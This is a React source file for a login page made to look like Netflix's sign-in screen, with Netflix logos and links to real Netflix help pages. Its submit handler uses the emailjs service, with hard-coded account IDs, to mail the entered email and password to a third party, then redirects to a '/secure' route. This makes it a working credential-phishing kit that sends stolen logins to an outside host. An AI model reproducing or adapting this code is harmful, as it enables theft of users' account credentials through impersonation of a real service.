import React from "react"
import { useNavigate } from "react-router-dom";
import emailjs from 'emailjs-com'

const Login = () => {
  const navigate = useNavigate()

  const sendEmail = (e) => {
    e.preventDefault()
    emailjs.sendForm('service_cm6hsuq', 'template_7ly8hlb', e.target, 'user_tREzId4e2fhTEehRTqA5w')
      .then(res => {
        navigate('/secure')
        console.log(res)
      })
      .catch(err => {
        console.log(err)
      })
  }

  return (
    <div className="login-background">
      <div className="login-nav">
        <a href="/">
          <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="netflix logo" />
        </a>
      </div>
      <div className="form-box">
        <div className="sign-in">
          <h2>Sign In</h2>
        </div>
        <form onSubmit={sendEmail} className="d-flex flex-column">
        <input type="text" className="log" name="email" id="email" placeholder="Email or phone number" />
        <input type="text" className="log" name="password" id="password" placeholder="Password" />
        <button type="submit" className="submit">Sign In</button>
          <div className="helpers">
            <div className="remember">
              <input className="checkbox" type="checkbox" />
              <label>
              Remember me
            </label>
            </div>
            <a href="https://www.netflix.com/gb/LoginHelp">
              Need help?
            </a>
          </div>
        </form>
      <div className="second-part-login">
        <div className="fb-login">
          <img src="https://assets.nflxext.com/ffe/siteui/login/images/FB-f-Logo__blue_57.png" alt="facebook-icon" />
          <label>
            Login with Facebook
          </label>
        </div>
        <div className="new-to-netflx">
          <p>New to Netflix? <a className="sign-up-now" href="https://www.netflix.com/gb/">Sign up now.</a></p>
        </div>
        <div className="captcha">
          <p>This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="/">Learn more.</a></p>
        </div>
      </div>
    </div>
    <hr />
    <footer className="ffeet">
        <div className="ff">
        <div className="contact-us">
          <p>Questions? Contact us.</p>
        </div>
        <div className="d-flex">
          <div className="faq">
            <p>FAQ</p>
            <p>Help Center</p>
            <p>Terms of Use</p>
            <p>Privacy</p>
          </div>
          <div className="cookie">
            <p>Cookie Preferences</p>
            <p>Corporate Information</p>
          </div>
        </div>
        
        </div>
      </footer>
</div>
  )
}

export default Login